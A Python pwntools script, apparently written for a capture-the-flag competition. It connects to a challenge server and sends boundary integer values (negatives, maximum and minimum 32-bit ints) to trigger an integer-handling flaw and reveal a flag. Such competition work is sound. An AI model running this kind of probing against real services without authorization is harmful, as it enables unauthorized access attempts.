#!/usr/bin/env python3
from pwn import *

# Context settings
context.log_level = 'info'

host = "chals.uscc-cyberbowl-2025.ctf.institute"
port = 3015

def try_access(value):
    print(f"\n{'='*60}")
    print(f"Trying access band: {value}")
    print(f"{'='*60}")
    
    try:
        # Connect to the server
        conn = remote(host, port, timeout=10)
        
        # Receive the initial prompt
        prompt = conn.recvuntil(b":", timeout=5)
        
        # Send our input
        conn.sendline(str(value).encode())
        
        # Wait a bit
        sleep(0.5)
        
        # Receive the response
        try:
            response = conn.recvall(timeout=3)
            output = response.decode('utf-8', errors='ignore')
            print(output)
            
            # Check if we got the flag
            if 'USCC{' in output or 'RAIDER KING' in output or 'flag' in output.lower():
                print("\n" + "!"*60)
                print("POTENTIAL FLAG FOUND!")
                print("!"*60)
            
            return response
        except:
            return None
        
    except Exception as e:
        print(f"Error: {e}")
        return None
    finally:
        try:
            conn.close()
        except:
            pass

# Try various approaches
test_values = [
    -1, -2, -7,  # Negative numbers
    0x7fffffff,  # Max int
    -0x80000000, # Min int (might wrap to specific value)
    100, 124, 127, 255, 256,  # Various large numbers
]

for val in test_values:
    result = try_access(val)
    if result and b'USCC{' in result:
        print(f"\n\nFOUND IT WITH VALUE: {val}")
        break
